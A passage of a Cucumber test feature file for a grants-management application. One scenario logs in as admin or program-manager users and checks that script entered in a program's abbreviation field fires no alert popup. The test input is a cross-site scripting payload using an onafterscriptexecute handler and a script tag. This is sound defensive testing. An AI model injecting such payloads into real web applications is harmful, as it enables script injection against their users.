      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300080 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                      | Field                |
      |   <xss onafterscriptexecute=alert(1)><script>1</script>    | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
